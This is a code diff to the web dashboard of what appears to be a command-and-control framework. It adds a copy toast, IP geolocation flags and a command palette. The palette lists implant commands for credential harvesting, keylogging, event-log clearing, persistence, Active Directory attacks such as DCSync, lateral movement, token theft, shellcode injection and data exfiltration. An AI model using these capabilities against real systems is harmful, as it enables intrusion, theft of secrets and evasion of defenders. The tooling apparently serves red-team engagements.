@@ -370,6 +370,63 @@ tr.clickable { cursor: pointer; }
 .qbtn.danger { border-color: rgba(239,68,68,0.3); }
 .qbtn.danger:hover { border-color: var(--red); color: var(--red); background: var(--red-dim); }
 
+/* ══════ COPY TOAST ══════ */
+.copy-toast {
+  position: fixed; bottom: 28px; left: 50%; transform: translateX(-50%) translateY(20px);
+  background: var(--violet); color: #fff; padding: 8px 20px; border-radius: 20px;
+  font-size: 12px; font-weight: 600; letter-spacing: 0.3px;
+  opacity: 0; pointer-events: none; z-index: 9999;
+  transition: opacity 0.2s, transform 0.2s;
+  box-shadow: 0 4px 20px rgba(124,58,237,0.4);
+}
+.copy-toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+.copyable { cursor: pointer; position: relative; transition: color 0.15s; }
+.copyable:hover { color: var(--violet-light) !important; }
+.copyable:hover::after {
+  content: '⎘'; font-size: 10px; margin-left: 4px; opacity: 0.6;
+  vertical-align: middle;
+}
+
+/* ══════ GEO FLAG ══════ */
+.geo-flag { font-size: 14px; margin-right: 4px; vertical-align: middle; }
+.geo-country { font-size: 10px; color: var(--text-muted); margin-left: 4px; vertical-align: middle; }
+
+/* ══════ COMMAND PALETTE ══════ */
+#cmd-palette-overlay {
+  display: none; position: fixed; inset: 0; z-index: 10000;
+  background: rgba(0,0,0,0.7); backdrop-filter: blur(4px);
+  align-items: flex-start; justify-content: center; padding-top: 120px;
+}
+#cmd-palette-overlay.open { display: flex; }
+#cmd-palette {
+  width: 580px; max-height: 480px;
+  background: #0d1020; border: 1px solid var(--violet);
+  border-radius: 12px; overflow: hidden;
+  box-shadow: 0 30px 80px rgba(0,0,0,0.8), 0 0 0 1px rgba(124,58,237,0.2);
+  display: flex; flex-direction: column;
+}
+#cmd-palette-input {
+  width: 100%; padding: 16px 20px; background: transparent; border: none;
+  border-bottom: 1px solid #1e2440; color: var(--text-primary);
+  font-size: 15px; font-family: 'JetBrains Mono', monospace; outline: none;
+  caret-color: var(--violet-light);
+}
+#cmd-palette-input::placeholder { color: #2a3050; }
+#cmd-palette-results { overflow-y: auto; max-height: 380px; padding: 6px 0; }
+#cmd-palette-results::-webkit-scrollbar { width: 3px; }
+#cmd-palette-results::-webkit-scrollbar-thumb { background: #1e2440; }
+.palette-item {
+  display: flex; align-items: center; gap: 12px;
+  padding: 10px 20px; cursor: pointer; transition: background 0.1s;
+}
+.palette-item:hover, .palette-item.active { background: var(--violet-dim); }
+.palette-item .pi-icon { font-size: 16px; width: 24px; text-align: center; flex-shrink: 0; }
+.palette-item .pi-cmd { font-family: monospace; font-size: 13px; font-weight: 700; color: var(--violet-light); min-width: 160px; }
+.palette-item .pi-desc { font-size: 12px; color: var(--text-muted); flex: 1; }
+.palette-item .pi-cat { font-size: 10px; font-weight: 700; padding: 2px 7px; border-radius: 8px; background: rgba(124,58,237,0.1); color: #6060a0; }
+.palette-sep { padding: 6px 20px 2px; font-size: 10px; font-weight: 700; color: #2a3050; text-transform: uppercase; letter-spacing: 1.5px; }
+
 /* ══════ PAYLOAD GENERATOR ══════ */
 .pl-cat-btn {
   padding: 7px 14px; border-radius: 6px; border: 1px solid var(--border);
@@ -444,6 +501,7 @@ tr.clickable { cursor: pointer; }
   </div>
   <div class="topbar-center"></div>
   <div class="topbar-right">
+    <button onclick="openPalette()" title="Command Palette (Ctrl+K)" style="background:rgba(124,58,237,0.1);border:1px solid rgba(124,58,237,0.3);border-radius:6px;cursor:pointer;font-size:11px;color:var(--violet-light);padding:4px 10px;font-weight:600;letter-spacing:0.3px">⌘ Ctrl+K</button>
     <span class="top-label" id="engagement-timer" title="Engagement duration">⏱ 00:00:00</span>
     <button onclick="toggleNotifications()" style="background:none;border:none;cursor:pointer;font-size:16px;position:relative" id="notif-btn" title="Toggle browser notifications">🔔</button>
     <button onclick="generateReport()" style="background:none;border:none;cursor:pointer;font-size:14px;color:var(--text-muted)" title="Generate report">📄 Report</button>
@@ -1629,6 +1687,7 @@ async function refreshAll() {
   populateBackdoorListeners();
   bdTypeChanged();
   if (!window._plCategoryInit) { window._plCategoryInit = true; plCategory('agent'); }
+  geoLookupAll();
   loadBinaryList();
   const tasks = await fetchJ('/api/tasks');
   const events = await fetchJ('/api/events') || [];
@@ -1680,9 +1739,9 @@ async function refreshAll() {
           '<div style="width:1px;height:28px;background:var(--border);flex-shrink:0"></div>' +
           // Host / User / IP
           '<div style="display:flex;gap:16px;flex:1;min-width:0">' +
-            '<div><div style="font-size:9px;color:var(--text-muted);text-transform:uppercase;letter-spacing:.5px">Host</div><div style="font-size:12px;color:var(--text-primary);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:140px">'+a.hostname+'</div></div>' +
-            '<div><div style="font-size:9px;color:var(--text-muted);text-transform:uppercase;letter-spacing:.5px">User</div><div style="font-size:12px;color:var(--text-primary);white-space:nowrap">'+a.username+'</div></div>' +
-            '<div><div style="font-size:9px;color:var(--text-muted);text-transform:uppercase;letter-spacing:.5px">IP</div><div style="font-size:12px;color:var(--cyan);font-family:monospace">'+a.ip+'</div></div>' +
+            '<div><div style="font-size:9px;color:var(--text-muted);text-transform:uppercase;letter-spacing:.5px">Host</div><div class="copyable" onclick="copyText(\''+a.hostname+'\',\'hostname\')" style="font-size:12px;color:var(--text-primary);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:140px">'+a.hostname+'</div></div>' +
+            '<div><div style="font-size:9px;color:var(--text-muted);text-transform:uppercase;letter-spacing:.5px">User</div><div class="copyable" onclick="copyText(\''+a.username+'\',\'user\')" style="font-size:12px;color:var(--text-primary);white-space:nowrap">'+a.username+'</div></div>' +
+            '<div><div style="font-size:9px;color:var(--text-muted);text-transform:uppercase;letter-spacing:.5px">IP</div><div class="copyable" onclick="copyText(\''+a.ip+'\',\'IP\')" style="font-size:12px;color:var(--cyan);font-family:monospace">'+geoHtml(a.ip)+a.ip+'</div></div>' +
             '<div><div style="font-size:9px;color:var(--text-muted);text-transform:uppercase;letter-spacing:.5px">Last Seen</div><div class="agent-lastseen-'+a.name.replace(/[^a-z0-9]/gi,'_')+'" style="font-size:12px;color:var(--text-secondary)">'+a.last_seen+'</div></div>' +
           '</div>' +
           // Tags
@@ -4450,6 +4509,10 @@ function notifyNewAgent(name, hostname) {
 
 // ──── Keyboard Shortcuts ────
 document.addEventListener('keydown', function(e) {
+  // Ctrl+K — command palette
+  if (e.key === 'k' && e.ctrlKey) { e.preventDefault(); openPalette(); return; }
+  if (e.key === 'Escape') { closePalette(); return; }
+
   if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.tagName === 'SELECT') return;
   const pages = ['dashboard','agents','listeners','tasks','terminal','payloads','files','creds','events'];
   if (e.key >= '1' && e.key <= '9' && (e.ctrlKey || e.altKey)) {
@@ -4466,6 +4529,195 @@ document.addEventListener('keydown', function(e) {
   }
   if (e.key === '/' && !e.ctrlKey) { e.preventDefault(); document.getElementById('term-input').focus(); }
 });
+
+// ──── Copy to Clipboard ────
+function copyText(text, label) {
+  navigator.clipboard.writeText(text).then(() => {
+    const t = document.getElementById('copy-toast');
+    t.textContent = '✓ Copied' + (label ? ': ' + label : '');
+    t.classList.add('show');
+    setTimeout(() => t.classList.remove('show'), 1800);
+  });
+}
+
+// ──── Geo Flag ────
+const _geoCache = {};
+const _PRIVATE = /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.|::1|localhost)/;
+
+function countryFlag(code) {
+  if (!code || code.length !== 2) return '';
+  return code.toUpperCase().split('').map(c => String.fromCodePoint(c.charCodeAt(0) + 127397)).join('');
+}
+
+async function geoLookup(ip) {
+  if (!ip || _PRIVATE.test(ip)) return null;
+  if (_geoCache[ip]) return _geoCache[ip];
+  try {
+    const r = await fetch('https://ip-api.com/json/'+ip+'?fields=countryCode,country,city');
+    if (!r.ok) return null;
+    const d = await r.json();
+    if (d.countryCode) {
+      _geoCache[ip] = { flag: countryFlag(d.countryCode), country: d.country, city: d.city };
+      return _geoCache[ip];
+    }
+  } catch(e) {}
+  return null;
+}
+
+function geoHtml(ip) {
+  const g = _geoCache[ip];
+  if (!g) return '';
+  return ' <span class="geo-flag" title="'+g.country+(g.city?', '+g.city:'')+'">'+ g.flag +'</span>';
+}
+
+// Kick off geo lookups for all visible IPs
+function geoLookupAll() {
+  if (!window._cachedAgents) return;
+  window._cachedAgents.forEach(a => {
+    if (a.ip && !_PRIVATE.test(a.ip) && !_geoCache[a.ip]) {
+      geoLookup(a.ip).then(g => { if (g) window._lastDashKey = ''; }); // force next refresh to re-render
+    }
+  });
+}
+
+// ──── Command Palette ────
+const PALETTE_CMDS = [
+  // Agent commands
+  {cat:'Shell',    icon:'💻', cmd:'shell',            desc:'Execute shell command',               agent:true},
+  {cat:'Info',     icon:'ℹ️',  cmd:'sysinfo',          desc:'Full system information',             agent:true},
+  {cat:'Info',     icon:'🌐', cmd:'ifconfig',         desc:'Network interfaces & IPs',            agent:true},
+  {cat:'Info',     icon:'⚙️',  cmd:'ps',               desc:'List running processes',              agent:true},
+  {cat:'Info',     icon:'📋', cmd:'info',             desc:'Agent details & metadata',            agent:true},
+  {cat:'Info',     icon:'📋', cmd:'tasks',            desc:'Task history for this agent',         agent:true},
+  {cat:'Files',    icon:'📁', cmd:'ls',               desc:'List directory contents',             agent:true},
+  {cat:'Files',    icon:'📥', cmd:'download',         desc:'Download file from agent',            agent:true},
+  {cat:'Files',    icon:'📤', cmd:'upload',           desc:'Upload file to agent',                agent:true},
+  {cat:'Recon',    icon:'📸', cmd:'screenshot',       desc:'Capture screen',                      agent:true},
+  {cat:'Recon',    icon:'🔑', cmd:'creds all',        desc:'Harvest all credentials',             agent:true},
+  {cat:'Recon',    icon:'🔑', cmd:'creds browser',    desc:'Browser saved passwords',             agent:true},
+  {cat:'Recon',    icon:'🔑', cmd:'creds wifi',       desc:'Saved WiFi passwords',                agent:true},
+  {cat:'Recon',    icon:'⌨️',  cmd:'keylog 30',        desc:'Keylog for 30 seconds',               agent:true},
+  {cat:'Evasion',  icon:'🛡️',  cmd:'evasion',          desc:'Run all bypass techniques',           agent:true},
+  {cat:'Evasion',  icon:'🕐', cmd:'sleep 60 20',      desc:'Set sleep 60s / 20% jitter',          agent:true},
+  {cat:'Evasion',  icon:'🧹', cmd:'evasion clearlogs','desc':'Clear Windows/Linux event logs',    agent:true},
+  {cat:'Persist',  icon:'🔒', cmd:'persist registry', desc:'Registry run key (no admin)',         agent:true},
+  {cat:'Persist',  icon:'🔒', cmd:'persist schtask',  desc:'Scheduled task on logon',             agent:true},
+  {cat:'Persist',  icon:'🔒', cmd:'persist cron',     desc:'Cron job (Linux)',                    agent:true},
+  {cat:'Persist',  icon:'🔒', cmd:'persist launchagent','desc':'LaunchAgent plist (macOS)',       agent:true},
+  {cat:'Persist',  icon:'📋', cmd:'persist list',     desc:'List installed persistence',          agent:true},
+  {cat:'Persist',  icon:'🗑️',  cmd:'persist remove',  desc:'Remove all persistence',              agent:true},
+  {cat:'Pivot',    icon:'🔗', cmd:'socks start 1080', desc:'Start SOCKS5 proxy on 1080',          agent:true},
+  {cat:'Pivot',    icon:'🔗', cmd:'socks stop',       desc:'Stop SOCKS5 proxy',                   agent:true},
+  {cat:'Pivot',    icon:'🔗', cmd:'pivot start',      desc:'Start SMB named pipe relay',          agent:true},
+  {cat:'Pivot',    icon:'🔗', cmd:'portfwd',          desc:'Port forwarding through agent',       agent:true},
+  {cat:'AD',       icon:'🏢', cmd:'ad-enum-users',    desc:'Enumerate Active Directory users',    agent:true},
+  {cat:'AD',       icon:'🏢', cmd:'ad-enum-computers','desc':'Enumerate AD computers',            agent:true},
+  {cat:'AD',       icon:'🏢', cmd:'ad-kerberoast',    desc:'Kerberoasting attack',                agent:true},
+  {cat:'AD',       icon:'🏢', cmd:'ad-asreproast',    desc:'AS-REP Roasting',                     agent:true},
+  {cat:'AD',       icon:'🏢', cmd:'ad-dcsync',        desc:'DCSync — dump domain hashes',         agent:true},
+  {cat:'AD',       icon:'🏢', cmd:'ad-adcs-enum',     desc:'Enumerate ADCS cert templates',       agent:true},
+  {cat:'Lateral',  icon:'↔️',  cmd:'lateral wmiexec',  desc:'WMI lateral movement',               agent:true},
+  {cat:'Lateral',  icon:'↔️',  cmd:'lateral winrm',    desc:'WinRM lateral movement',             agent:true},
+  {cat:'Lateral',  icon:'↔️',  cmd:'lateral ssh',      desc:'SSH lateral movement',               agent:true},
+  {cat:'Lateral',  icon:'↔️',  cmd:'lateral pth',      desc:'Pass-the-Hash',                      agent:true},
+  {cat:'Token',    icon:'🎫', cmd:'token steal',      desc:'Steal access token from process',     agent:true},
+  {cat:'Token',    icon:'🎫', cmd:'token impersonate','desc':'Impersonate stolen token',          agent:true},
+  {cat:'Inject',   icon:'💉', cmd:'inject earlybird', desc:'Early Bird APC injection',            agent:true},
+  {cat:'Inject',   icon:'💉', cmd:'shellcode',        desc:'Execute raw shellcode in-memory',     agent:true},
+  {cat:'Exfil',    icon:'📡', cmd:'exfil dns',        desc:'DNS subdomain exfiltration',          agent:true},
+  {cat:'Exfil',    icon:'📡', cmd:'exfil http',       desc:'HTTP POST exfiltration',              agent:true},
+  // Global
+  {cat:'Global',   icon:'🖥️',  cmd:'agents',           desc:'List all connected agents',           agent:false},
+  {cat:'Global',   icon:'📡', cmd:'listeners',        desc:'Manage listeners',                    agent:false},
+  {cat:'Global',   icon:'📋', cmd:'tasks',            desc:'View all task history',               agent:false},
+  {cat:'Global',   icon:'🔍', cmd:'loot',             desc:'View captured loot',                  agent:false},
+  {cat:'Global',   icon:'📊', cmd:'report md',        desc:'Generate Markdown report',            agent:false},
+];
+
+let _paletteIdx = 0;
+let _paletteFiltered = [];
+
+function openPalette() {
+  const overlay = document.getElementById('cmd-palette-overlay');
+  overlay.classList.add('open');
+  const input = document.getElementById('cmd-palette-input');
+  input.value = '';
+  filterPalette('');
+  setTimeout(() => input.focus(), 50);
+}
+
+function closePalette() {
+  document.getElementById('cmd-palette-overlay').classList.remove('open');
+}
+
+function filterPalette(q) {
+  q = q.toLowerCase().trim();
+  _paletteFiltered = q
+    ? PALETTE_CMDS.filter(c => c.cmd.toLowerCase().includes(q) || c.desc.toLowerCase().includes(q) || c.cat.toLowerCase().includes(q))
+    : PALETTE_CMDS;
+  _paletteIdx = 0;
+  renderPalette();
+}
+
+function renderPalette() {
+  const el = document.getElementById('cmd-palette-results');
+  if (_paletteFiltered.length === 0) {
+    el.innerHTML = '<div style="padding:20px;text-align:center;color:var(--text-muted);font-size:13px">No commands found</div>';
+    return;
+  }
+  // Group by category
+  const cats = {};
+  _paletteFiltered.forEach((c,i) => {
+    (cats[c.cat] = cats[c.cat] || []).push({...c, _i: i});
+  });
+  let html = '';
+  let idx = 0;
+  Object.keys(cats).forEach(cat => {
+    html += '<div class="palette-sep">' + cat + '</div>';
+    cats[cat].forEach(c => {
+      html += '<div class="palette-item' + (c._i === _paletteIdx ? ' active' : '') + '" onclick="runPaletteCmd(' + c._i + ')">' +
+        '<span class="pi-icon">' + c.icon + '</span>' +
+        '<span class="pi-cmd">' + c.cmd + '</span>' +
+        '<span class="pi-desc">' + c.desc + '</span>' +
+        '<span class="pi-cat">' + (c.agent ? '🖥 agent' : '🌐 global') + '</span>' +
+        '</div>';
+    });
+  });
+  el.innerHTML = html;
+}
+
+function paletteKeydown(e) {
+  if (e.key === 'ArrowDown') {
+    e.preventDefault();
+    _paletteIdx = Math.min(_paletteIdx + 1, _paletteFiltered.length - 1);
+    renderPalette();
+    document.querySelector('.palette-item.active')?.scrollIntoView({block:'nearest'});
+  } else if (e.key === 'ArrowUp') {
+    e.preventDefault();
+    _paletteIdx = Math.max(_paletteIdx - 1, 0);
+    renderPalette();
+    document.querySelector('.palette-item.active')?.scrollIntoView({block:'nearest'});
+  } else if (e.key === 'Enter') {
+    if (_paletteFiltered[_paletteIdx]) runPaletteCmd(_paletteIdx);
+  } else if (e.key === 'Escape') {
+    closePalette();
+  }
+}
+
+function runPaletteCmd(idx) {
+  const c = _paletteFiltered[idx];
+  if (!c) return;
+  closePalette();
+  nav('terminal');
+  const input = document.getElementById('term-input');
+  if (input) {
+    input.value = c.cmd;
+    input.focus();
+    // Auto-send if it's not a partial command needing args
+    const needsArgs = ['shell','download','upload','portfwd','inject','shellcode','keylog','sleep','persist','lateral','token','pivot','socks','exfil','ad-adcs-request'].some(p => c.cmd === p);
+    if (!needsArgs) sendTermCmd();
+  }
+}
 
 // ──── Sleep/Jitter Control ────
 async function updateSleep() {
@@ -4606,5 +4858,16 @@ setInterval(loadLoot, 15000);
 setInterval(function(){ drawPivotGraph(); updateIOC(); }, 5000);
 setTimeout(function(){ drawPivotGraph(); updateIOC(); }, 2000);
 </script>
+<!-- Copy toast -->
+<div class="copy-toast" id="copy-toast">✓ Copied</div>
+
+<!-- Command Palette -->
+<div id="cmd-palette-overlay" onclick="if(event.target===this)closePalette()">
+  <div id="cmd-palette">
+    <input id="cmd-palette-input" placeholder="Search commands..." oninput="filterPalette(this.value)" onkeydown="paletteKeydown(event)" autocomplete="off" spellcheck="false">
+    <div id="cmd-palette-results"></div>
+  </div>
+</div>
+
 </body>
 </html>`
